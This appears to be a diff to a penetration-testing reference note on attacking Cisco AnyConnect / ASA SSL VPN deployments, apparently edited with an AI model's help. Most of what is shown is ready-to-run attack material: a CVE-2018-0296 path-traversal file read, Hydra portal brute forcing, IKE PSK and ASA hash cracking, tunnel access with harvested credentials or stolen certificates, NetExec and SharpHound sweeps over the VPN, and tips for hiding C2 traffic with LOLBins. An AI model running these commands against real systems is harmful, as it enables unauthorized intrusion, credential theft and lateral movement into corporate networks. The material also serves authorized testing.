@@ -1,7 +1,32 @@
 # Cisco AnyConnect / ASA SSL VPN
 
-## What is it?
-Cisco AnyConnect Secure Mobility Client — SSL VPN solution backed by Cisco ASA (Adaptive Security Appliance) or FTD (Firepower Threat Defense). Widely deployed in enterprise for remote access. Attack surface includes the ASA management interface, SSL VPN portal, and the AnyConnect client itself.
+#CiscoAnyConnect #SSLVPN #ASA #FTD #IPsec #remoteaccess
+
+## What is Cisco AnyConnect?
+Cisco AnyConnect Secure Mobility Client — SSL VPN solution backed by Cisco ASA (Adaptive Security Appliance) or FTD (Firepower Threat Defense). Widely deployed in enterprise for remote access. Attack surface spans three layers: the ASA/FTD **appliance** (pre-auth CVEs, SNMP, IKE), the **SSL VPN portal** (username/group enumeration, credential spray, phishing), and the **AnyConnect client** itself (saved-credential/cert extraction, local privesc CVEs). A single valid credential + tunnel-group is a foothold onto the internal network.
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/File Transfer/cURL\|cURL]] | Portal enum, path-traversal PoCs, FDM/FMC REST API |
+| [[Tools/Scanning/NMAP\|NMAP]] | `ssl-cert`/`ssl-enum-ciphers`, `ike-version` NSE |
+| [[Tools/Network/ike-scan\|ike-scan]] | IKEv1/v2 enum + aggressive-mode group/PSK crack |
+| [[Tools/Auth/Hydra\|Hydra]] | Portal / ASDM credential brute force |
+| [[Tools/Auth/hashcat\|hashcat]] | Crack ASA Type 5/8/9 secrets (`-m 500`/`9200`/`9300`) |
+| [[Tools/Network/ciscot7\|ciscot7]] | Decode reversible Type 7 config passwords |
+| [[Tools/Network/onesixtyone\|onesixtyone]] | SNMP community-string brute |
+| [[Tools/Network/snmpwalk\|snmpwalk]] | ASA SNMP enum; `snmpset` → config-copy via TFTP |
+| [[Tools/Network/openconnect\|openconnect]] | FOSS client — connect the tunnel with harvested creds/cert |
+| [[Tools/Lateral Movement/NetExec\|NetExec]] | Internal sweep/spray once on the VPN |
+| [[Tools/AD/BloodHound\|BloodHound]] | AD attack-path collection over the tunnel (SharpHound) |
+| [[Tools/Auth/mimikatz\|mimikatz]] | DPAPI decrypt of saved VPN creds; cert/key export |
+| [[Tools/Credential Dumping/SharpDPAPI\|SharpDPAPI]] | DPAPI credential-blob decrypt without mimikatz |
+| [[Tools/Cloud/Evilginx2\|Evilginx2]] | Phishing portal capturing creds **and** session tokens |
+
+Also used inline: `psk-crack` (offline IKE PSK cracking), `procdump`/`comsvcs.dll` (vpnagent memory dump), `certutil` (cert export), GoPhish (portal phishing).
 
 ---
 
@@ -103,6 +128,25 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 # Check for CLIENTLESS bookmark traversal (unauthenticated path traversal)
 curl -sk "https://<target>/+CSCOE+/files/usr/share/doc/"
 ```
+
+---
+
+## Connect / Access
+
+Once you hold a valid username/password (+ tunnel-group) or an extracted client certificate, establish the tunnel from Linux with **openconnect** — no GUI client needed. This is the pivot onto the internal network.
+
+```bash
+# Password auth (protocol=anyconnect is the default); --authgroup = tunnel-group
+sudo openconnect --protocol=anyconnect --user=<user> --authgroup=<tunnel-group> https://<target>
+
+# Client-certificate auth (PFX exported from a compromised host's cert store — see extraction below)
+sudo openconnect --certificate=vpncert.pfx --key=vpncert.pfx https://<target>
+
+# After connect: the ASA pushes routes + internal DNS — enumerate the scope it just revealed
+ip route show ; cat /etc/resolv.conf     # pushed subnets + internal resolvers
+```
+
+> Split-tunnel config decides how much you see: full-tunnel routes everything, split-tunnel only pushes specific internal subnets. Read `ip route`/`route print` immediately to learn the in-scope internal ranges.
 
 ---
 
@@ -255,7 +299,7 @@ curl -sk https://<target>/CACHE/stc/1/index.html -v 2>&1 | grep -i 'X-CSTP'
 
 ---
 
-## Dangerous Configurations
+## Dangerous Settings
 
 | Config | Risk |
 |--------|------|
@@ -266,8 +310,6 @@ curl -sk https://<target>/CACHE/stc/1/index.html -v 2>&1 | grep -i 'X-CSTP'
 | ASDM accessible from internet | Brute force management interface |
 | `hostscan` not enforced | Unmanaged devices can connect |
 | ASA version < 9.16 | Multiple critical CVEs unpatched |
-
----
 
 ---
 
@@ -654,29 +696,6 @@ expert
 sudo su -
 ```
 
-## Quick Reference
-
-```bash
-# Version/banner grab
-curl -sk https://<target>/+CSCOE+/logon.html | grep -i version
-
-# CVE-2018-0296 path traversal check
-curl -sk --path-as-is "https://<target>/+CSCOU+/../+CSCOE+/files/etc/passwd"
-
-# Brute force portal
-hydra -l admin -P rockyou.txt <target> https-post-form "/+CSCOE+/logon.html:username=^USER^&password=^PASS^:Login failed"
-
-# Enumerate tunnel groups from portal
-curl -sk https://<target>/+CSCOE+/logon.html | grep -i tunnel
-
-# ASA CLI (if creds obtained)
-ssh admin@<target>
-show running-config
-show vpn-sessiondb anyconnect
-```
-
----
-
 ## Windows Client — Enumeration & Extraction
 
 ### PowerShell Enumeration
@@ -867,9 +886,9 @@ Test-NetConnection -ComputerName <dc-ip> -Port 5985   # WinRM
 net view \\<internal-server> /all
 net use \\<internal-server>\share /user:<domain>\<user> <pass>
 
-# CrackMapExec sweep over VPN
-crackmapexec smb <vpn-subnet>/24 --gen-relay-list relay-targets.txt
-crackmapexec smb <vpn-subnet>/24 -u <user> -p <pass> --shares
+# NetExec sweep over VPN (nxc — CrackMapExec is abandoned; use NetExec)
+nxc smb <vpn-subnet>/24 --gen-relay-list relay-targets.txt
+nxc smb <vpn-subnet>/24 -u <user> -p <pass> --shares
 
 # BloodHound collection over VPN
 .\SharpHound.exe -c All --domain corp.local --domaincontroller <dc-ip>
@@ -896,3 +915,28 @@ Get-ChildItem "C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\NVM\
 # Use LOLBins for C2 to blend in (rundll32, mshta, wscript, certutil)
 # Prefer TLS 443 traffic to blend with AnyConnect tunnel traffic
 ```
+---
+
+## Quick Reference
+
+| Goal | Command |
+|---|---|
+| Version / banner grab | `curl -sk https://host/+CSCOE+/logon.html \| grep -i version` |
+| Pre-auth file read (CVE-2018-0296) | `curl -sk --path-as-is "https://host/+CSCOU+/../+CSCOE+/files/etc/passwd"` |
+| Enumerate tunnel groups | `curl -sk https://host/+CSCOE+/logon.html \| grep -i tunnel` |
+| Portal brute force | `hydra -l admin -P rockyou.txt host https-post-form ".../logon.html:username=^USER^&password=^PASS^:Login failed"` |
+| IKE aggressive group/PSK | `ike-scan -A --id=<group> --pskcrack=h.txt host` → `psk-crack -d rockyou.txt h.txt` |
+| Decode Type 7 password | `ciscot7 <hex>` |
+| Crack Type 5/8/9 secret | `hashcat -m 500\|9200\|9300 '<hash>' rockyou.txt` |
+| Connect with creds | `sudo openconnect --user=<u> --authgroup=<group> https://host` |
+| ASA CLI (post-auth) | `ssh admin@host` → `show running-config` / `show vpn-sessiondb anyconnect` |
+
+---
+
+> [!note] **See also** — IPsec/IKE enum uses [[Tools/Network/ike-scan|ike-scan]]; connect the tunnel with [[Tools/Network/openconnect|openconnect]]; loot Cisco config passwords via [[Tools/Network/ciscot7|ciscot7]] + [[Tools/Auth/hashcat|hashcat]]. ASA config exfil overlaps [[Services/Network management/SNMP|SNMP]] (RW community → TFTP config-copy), [[Services/File Xfer/TFTP|TFTP]] and [[Techniques/Network Device Pentesting|Network Device Pentesting]]. TLS posture of the portal: [[Services/Network management/TLS|TLS]]. Saved-credential extraction feeds [[Tools/Auth/mimikatz|mimikatz]]/[[Tools/Credential Dumping/SharpDPAPI|SharpDPAPI]] (DPAPI). Remote-access sibling: [[Services/Remote Access/SSH|SSH]].
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
